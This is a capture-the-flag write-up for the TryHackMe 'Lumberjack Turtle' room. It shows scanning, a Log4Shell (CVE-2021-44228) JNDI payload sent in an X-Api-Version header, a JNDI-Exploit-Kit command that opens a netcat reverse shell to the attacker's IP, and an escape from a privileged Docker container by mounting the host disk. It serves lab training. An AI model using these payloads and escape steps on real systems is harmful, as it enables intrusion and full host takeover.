---
tags:
  - THM
  - Linux
  - Medium
  - Log4Shell
  - Docker
  - Capabilities
---
https://tryhackme.com/room/lumberjackturtle/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.159.104 jackturtle.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC jackturtle.thm

PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2a:b1:b2:78:b6:92:4f:5f:1a:4b:59:99:45:3a:1b (RSA)
|   256 23:79:40:ad:f9:82:16:6d:13:d5:3e:72:a5:42:d4:5f (ECDSA)
|_  256 1d:6f:b1:17:df:ce:5b:42:c3:6d:c0:47:4b:bc:9c:04 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found directory `/~logs/log4j` which suggest the CVE for Log4Shell:
```console
$ curl -i 'http://jackturtle.thm/~logs/log4j'

HTTP/1.1 200 
X-THM-HINT: CVE-2021-44228 against X-Api-Version
Content-Type: text/plain;charset=UTF-8
Content-Length: 47
Date: Sat, 20 Dec 2025 17:57:07 GMT

Hello, vulnerable world! What could we do HERE?
```
Test for Log4Shell vulnerability:
```console
$ nc -lvnp 4444

Connection from 10.66.159.104:56666
0
 `�
```
```console
$ curl -s 'http://jackturtle.thm/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.186.238:4444/a}'
```
# Exploitation
Set malicious LDAP and HTTP server:
```console
$ git clone https://github.com/pimps/JNDI-Exploit-Kit

$ cd JNDI-Exploit-Kit/

$ /usr/lib/jvm/java-8-openjdk/bin/java -jar JNDI-Exploit-Kit.jar -C 'nc 192.168.186.238 4444 -e /bin/bash'
...
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://192.168.186.238:1099/vihljz
ldap://192.168.186.238:1389/vihljz
...
```
Wait for connections:
```console
$ nc -lvnp 4444
```
Trigger reverse shell connection:
```console
$ curl -s 'http://jackturtle.thm/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.186.238:1389/vihljz}'
```
# Post-Exploitation
We are currently **root** but inside a Docker container:
```console
# hostname

81fbbf1def70
```
Find and get the **fake root flag**:
```console
# find / -iname '*flag*' 2>/dev/null
...
/opt/.flag1

# cat /opt/.flag1
```
Found a pretty **big device** (40 GB) for a container:
```console
# lsblk

NAME        MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
nvme0n1     259:0    0  40G  0 disk 
└─nvme0n1p1 259:2    0  40G  0 part /etc/hosts
nvme1n1     259:1    0   1G  0 disk 
nvme2n1     259:3    0   1G  0 disk 
```
Mount the **device** and realize its the real target machine:
```console
# mount /dev/nvme0n1p1 /mnt

# find /mnt -maxdepth 1
/mnt
/mnt/root
/mnt/boot
/mnt/initrd.img
/mnt/opt
/mnt/vmlinuz
/mnt/tmp
/mnt/srv
/mnt/lib
/mnt/mnt
/mnt/bin
/mnt/sbin
/mnt/lost+found
/mnt/home
/mnt/run
/mnt/.badr-info
/mnt/vmlinuz.old
/mnt/initrd.img.old
/mnt/usr
/mnt/var
/mnt/etc
/mnt/lib64
/mnt/dev
/mnt/media
/mnt/proc
/mnt/sys
```
Find the **real root flag**:
```console
# cat /mnt/root/root.txt
Pffft. Come on. Look harder.

# find /mnt/root
/mnt/root
/mnt/root/root.txt
/mnt/root/.viminfo
/mnt/root/.cache
/mnt/root/.cache/motd.legal-displayed
/mnt/root/.bashrc
/mnt/root/.profile
/mnt/root/.ssh
/mnt/root/.ssh/authorized_keys
/mnt/root/...
/mnt/root/.../._fLaG2

# cat /mnt/root/.../._fLaG2
```
If we gain access to the **real machine** and execute the next command, we would see that we have privileged mode, which essentially enables all capabilities inside the docker container, explaining why our breakout was successful with mount points:
```console
# docker inspect 81fbbf1def70 | grep Priv

            "Privileged": true,
```